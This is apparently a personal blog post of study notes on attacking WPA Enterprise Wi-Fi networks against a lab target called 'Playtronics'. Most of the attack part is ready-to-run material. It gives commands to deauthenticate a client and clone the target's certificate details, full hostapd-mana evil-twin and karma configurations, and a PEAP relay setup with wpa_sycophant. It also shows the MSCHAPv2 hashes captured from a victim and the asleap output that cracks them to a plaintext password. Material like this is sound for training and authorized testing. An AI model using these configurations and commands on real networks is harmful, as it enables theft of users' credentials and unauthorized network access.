---
description: >-
  Attacking WPA Enterprise
title:  Attacking WPA Enterprise     # Add title here
date: 2023-09-28 08:00:00 -0600                           # Change the date to match completion date
categories: [18 Wireless, Wireless Attacks]                     # Change Templates to Writeup
tags: [wireless, wpa enterprise]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Basics
- WPA Enterprise uses Extensible Authentication Protocol (EAP)
- Authentication is done using a Remote Authentication Dial-In User Service (RADIUS) server.
- Authentication to a RADIUS server with most common EAP methods, requires the use of certificates on the server side at the very least.
- It is common to use a username and password to authenticate, which could be tied to domain credentials.

### WPA enterprise
Each user uses his own user and password (if client certificates are not used). Each user's traffic is encrypted with a different key. 
Connection in windows:
![WPA-Enterprise-Windows](/assets/img/Pasted-image-20230928223432.png)

And in mac:
![WPA-Enterprise-Mac](/assets/img/Pasted-image-20230928223504.png)

Looks like a captive portal but it's safer. In WPA enterprise we attack the clients, not the AP nor the RADIUS 

Companies usually create their own CA to validate their certificates and make our forged certificates fail. For that they need to install a company certificate in every client

EAP-TTLS -> server authenicates with certificate. Client can optionally use certificate. There are versions EAP-TTLSv0 and EAP-TTLSv1. Inner auth methods: PAP, CHAP, MSCHAP, MSCHAPv2

PEAP vs TTLS: 
	EAP-TTLS has option to use client side certificate
	EAP-TTLS-PAP support (cleartext passord)
	EAP-PEAP is a wrapper around EAP carring the EAP for authenication
	TTLS is a wrapper around TLVs (type length values), which are RADIUS attributes


The server gives to the client a certificate, to make sure that the client sends credentials to a trusted server

#### EAP
WPA-Enterprise, authentication via a RADIUS server, not on the AP

We can host a RADIUS server with freeradius to handle authentication and hostap with custom certificates to create en evil twin of a WPA-Enterprise network

#### EAP (RADIUS)
WPA Enterprise uses Extensible Authentication Protocol (EAP). EAP is a framework for authentication, which allows a number of different authentication schemes or methods.

Authentication is done using a Remote Authentication Dial-In User Service (RADIUS) server. The client authenticates using a number of EAP frames, depending on the agreed upon authentication scheme, which are relayed by the AP to the RADIUS server. If authentication is successful, the result is then used as Pairwise Master Key (PMK) for the 4-way handshake, as opposed to PSK, where the passphrase is derived to generate the PMK.

Authentication to a RADIUS server with most common EAP methods, requires the use of certificates on the server side at the very least. Some older, now deprecated EAP methods don't require certificates. Although a number of authentication schemes are possible, just some of them are commonly used, due to their security, and integration with existing OS. It is common to use a username and password to authenticate, which could be tied to domain credentials.

We'll go over a few EAPs commonly used on Wi-Fi networks.

#### EAP-TLS
EAP Transport Layer Security (EAP-TLS) is one of the most secure authentication methods, as it uses certificates on the server side and client side, instead of login and passwords, so the client and server mutually authenticate each other.

#### EAP-TTLS
EAP Tunneled Transport Layer Security (EAP-TTLS), as the name suggests, also uses TLS. As opposed to EAP-TLS, it does not necessarily need client certificates. It creates a tunnel and then exchanges the credentials using one of the few possible different inner methods (also called **phase 2**), such as Challenge-Handshake Authentication Protocol (CHAP), Authentication Protocol (PAP), Microsoft CHAP (MS-CHAP), or MS-CHAPv2.

#### PEAP (MS-CHAPv2 and others)
Similarly to EAP-TTLS, Protected Extensible Authentication Protocol (PEAP) also creates a TLS tunnel before credentials are exchanged. Although different methods can be used within PEAP, MS-CHAPv2 is a commonly used inner method.

PEAP and EAP-TLS mostly differ on how the data is exchanged inside the TLS tunnel.

PEAP hashes are of the type netNTLMv1, that can be cracked with  -m 5500 in hashcat

### Attacking WPA Enterprise 
The attack against WPA Enterprise consists in setting up a fake Access Point that imitates the target Access Point, so that clients connect to ours and in the process we capture hashes of their passwords, that can be cracked.

#### Identifying the objective
Airodump-ng to get the BSSID and the MAC from one of the connected users:
```bash
sudo airodump-ng wlan0mon
 BSSID              PWR Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 FC:EC:DA:8F:2E:90  -40     639       19    1   2  300. WPA2 CCMP   MGT  Playtronics <----------

 BSSID              STATION            PWR   Rate    Lost  Packets  Probes
 FC:EC:DA:8F:2E:90  00:DC:FE:82:EF:06  -26   54 -54      0       31  Playtronics <-----------
```
> The AUTH column shows the AP has an authentication type of MGT, meaning WPA Enterprise.
{: .prompt-tip }

#### Capture traffic
Then we proceed to capture the packet as follows:
```bash
sudo airodump-ng -c 2 -w wpa --essid 'Playtronics' --bssid FC:EC:DA:8F:2E:90 wlan0
```

#### Deauthenticate the user
```bash
sudo aireplay-ng -0 1 -a FC:EC:DA:8F:2E:90 -c 00:DC:FE:82:EF:06 wlan0
13:30:30  Waiting for beacon frame (BSSID: FC:EC:DA:8F:2E:90) on channel 1
13:30:30  Sending 64 directed DeAuth (code 7). STMAC: [00:DC:FE:82:EF:06] [ 0| 0 ACKs]

```
> If no certificates are captured when the client reauthenticates, deauthenticate him again
{: .prompt-warning }

#### Analyze pcap with wireshark and extract certificate

Wireshark filter for packets with certificate: ``tls.handshake.certificate`` also works for [Tshark](https://shuciran.github.io/posts/Remote-Capture/#fnref:tshark-eap)

If from wireshark we now open Extensible Authentication Protocol > Transport Layer Security. We now have to open the TLSv1 Record Layer: Handshake Protocol: Certificate (or similar, as the TLS version will vary). Once there, we will have to expand Handshake Protocol: Certificate item, then Certificates (plural). Inside Certificates, we can see one or more entries named Certificate. Each of them will be preceded by the length. For each certificate, we right click and select Export Packet Bytes to save the data into a file with a .der extension.4

![Wireshark-Certificate-Download](/assets/img/Pasted-image-20230928231211.png)

Finally, we can get information about the certificate with `openssl x509 -inform der -in CERT_FILENAME -text` or we can check the validity by using ``openssl x509 -in CERT_FILENAME -noout -enddate`` where **CERT_FILENAME** is the .pem or .crt file.

#### Modify Freeradius Configuration Files

Install freeradius `sudo apt install freeradius`

##### Certificate Authority
This should be similar to the certificate that we captured during `Analyze pcap with wireshark and extract certificate`
```bash
# The folder is unreachable even with sudo, so you need to become root first
sudo -s

nano /etc/freeradius/3.0/certs/ca.cnf

...
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
...
```
##### Server Configuration
We will edit the [server] fields to match our target server certificate
```bash
nano server.cnf
...
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
...
```

#### Building Certificates
Run the following to regenerate diffie hellman with a 2048 bit key and create the certificates

```bash
# in /etc/freeradius/3.0/certs folder:
rm dh
make
```

> If we run make but the certificates already exist, we will not be able to overwrite them. We have to run `make destroycerts` to clean up first.
{: .prompt-warning }

#### Configuring hostapd
Afterward, we have to create the hostapd-mana configuration file, /etc/hostapd-mana/mana.conf
```bash
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we'll create after this step
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```
#### Create the eap_user file

We'll now need to create the EAP user file referenced in the configuration file, /etc/hostapd-mana/mana.eap_user. The file should contain the following.

```bash
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

#### Start hostapd-mana
Next, we'll start hostapd-mana with the configuration file we created earlier, /etc/hostapd-mana/mana.conf.
```bash
sudo hostapd-mana /etc/hostapd-mana/mana.conf
Configuration file: mana.conf
MANA: Captured credentials will be written to file '/tmp/hostapd.credout'.
Using interface wlan0 with hwaddr 16:93:8a:98:ec:4f and ssid "Playtronics"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
```

When a victim attempts to authenticate to our AP, the login attempt is captured. These credentials are also in /tmp/hostapd.credout.

```bash
...
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: authenticated
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED 00:2b:bb:b0:42:9e
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: cosmo
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: cosmo
MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
...
```

#### Cracking the password
We will be using asleap to crack the password hash
```bash
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
Using wordlist mode with "/usr/share/john/password.lst".
        hash bytes:        586c
        NT hash:           8846f7eaee8fb117ad06bdd830b7586c
        password:          password
```

### TIPS for hostapd-mana
TIPS:
- For testing you may need to change your client settings and turn off and on the wifi, while hostapd-mana remains running all the time, capturing creentials when connection attempts happen, and only if the configuration of the client is the right one for hostapd-mana to get hashes or credentials (EAP connections). at times hostapd-mana may behave strangely after many failed connections, just rerun it, but remember that most of the tweaking happens on the client when messing with the configuration, or if we want to generate traffic, just keep hostapd-mana running and turn off and on wifi on the client after changing the config.
- The channel doesn't matter, but if we use the same as the original it's easier to monitor both networks at once with airodump
- Disable monitor mode to host an AP with hostapd-mana
- If we don't clone the BSSID the channel we use doesn't matter, but if we clone it, we must use a different channel to avoid errors
- mana adds functions that hostapd doesn't have

#### Options in the configuration files of hostapd-mana
- mana_wpe=1 -> to sniff credentials
- mana_eapsuccess=1 -> To let the victim know that he was successful when connecting to us
- mana_credout=``<file>`` -> Saves creds to a file
- eap_server=1 -> Use the internal EAP server, not an external one
- enable_mana=1 -> karma attack, respond to every client that tries to connect to us, making him believe that we are the SSID that he is probing

```
interface=wlan1
ssid=<ESSID>
hw_mode=g
channel=6
auth_algs=3
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
mana_credout=hostapd.creds
```

### Attack PEAP-GTC

```
interface=wlan1
ssid=<target ESSID>
channel=6
hw_mode=g
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
private_key_passwd=
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
```

### Karma attack
So that many clients can connect to us simultaneously
```
interface=wlan1
ssid=<target ESSID>
channel=6
hw_mode=g
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
enable_mana=1
mana_credout=hostapd.creds
```

hostapd-mana returns strings to crack WPA-EAP in the following formats
	- asleap
	- john
	- hashcat
> Sometimes one tool isn't able to crack it and other is. If one doesn't find the password try with other and the same dictionary.
{: .prompt-warning }

### PEAP relay attack
More info:
https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/
https://www.youtube.com/watch?v=3FSLM1VY0SQ
https://www.youtube.com/watch?v=XYgBw8mx9Jw

3 interfaces are needed:
- wlan0 for hostapd-mana
- wlan1 for sycophant
- wlan2 recon and for deauthenticating clients

#### wlan0
file for hostapd-mana:
```
interface=wlan0
ssid=<target ESSID>
channel=6
hw_mode=g
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
private_key_passwd=
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
enable_mana=1
enable_sycophant=1
sycophant_dir=/tmp/
```


Run hostapd:
``hostapd-mana ap.conf``

#### wlan1
sycophant configuration file:
```
network={
ssid="<target ESSID>"
# The SSID you would like to relay and authenticate against.
scan_ssid=1
key_mgmt=WPA-EAP
# Do not modify
identity=""
anonymous_identity=""
password=""
# This initialises the variables for me.
# -------------
eap=PEAP
phase1="crypto_binding=0 peaplabel=0"
phase2="auth=MSCHAPV2"
# Dont want to connect back to ourselves,
# so add your rogue BSSID here.
bssid_blacklist=<hostapd-mana MAC>
}
```
In the last line we use the MAC of the interface with hostapd-mana (wlan0 in this case)

Run with
``./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan1``

#### wlan2
Deauth a client connected to the target network so that it (hopefully) connects to our rogue AP, which will relay traffic to sycophant
``aireplay-ng -0 4 -a <target BSSID> -c <target client MAC> wlan2``

We should see the connection in sycophant if everything goes well, and then in wlan2 we can do the following to get an IP
``dhclient -v wlan1``


### EAPhammer:
Tool to create fake APs
```bash
./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid DefenseConference --creds

# karma attack, make every client believe that we are the AP(s) that he is probing. The difference between karma attack and evil twin is that karma uses the probe requests sent by clients (from their preferred network list, PNL) and in evil twin we must guess the APs they want to connect to
./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid DefenseConference --creds --karma
```

### EAP MD5 crack
``./eapmd5pass -w dict -r eapmd5-sample.dump``


